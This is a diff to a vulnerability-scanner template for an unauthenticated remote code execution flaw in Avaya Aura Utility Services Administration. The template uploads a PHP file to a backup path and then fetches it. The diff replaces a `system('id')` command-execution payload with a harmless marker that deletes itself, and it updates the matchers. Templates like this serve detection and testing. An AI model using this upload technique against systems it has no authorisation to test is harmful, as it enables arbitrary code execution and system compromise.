@@ -4,7 +4,8 @@ info:
   name: Avaya Aura Utility Services Administration - Remote Code Execution
   author: DhiyaneshDk
   severity: critical
-  description: Avaya Aura Utility Services Administration is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  description: |
+    Avaya Aura Utility Services Administration is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
   reference:
     - https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/
     - https://download.avaya.com/css/public/documents/101076366
@@ -26,7 +27,7 @@ http:
         User-Agent: AVAYA
         Connection: close
 
-        <?php system('id');
+        <?php print('avaya-aura-rce');unlink(__FILE__);
 
       - |
         GET /PhoneBackup/{{randstr}}.php HTTP/1.1
@@ -36,14 +37,8 @@ http:
 
     matchers-condition: and
     matchers:
-      - type: regex
-        part: body_2
-        regex:
-          - 'uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)'
-
-      - type: word
-        part: header_2
-        words:
-          - "text/html"
-
-# Enhanced by md on 2023/03/22
+      - type: dsl
+        dsl:
+          - "status_code_1 == 201"
+          - 'contains(body_2, "avaya-aura-rce")'
+        condition: and
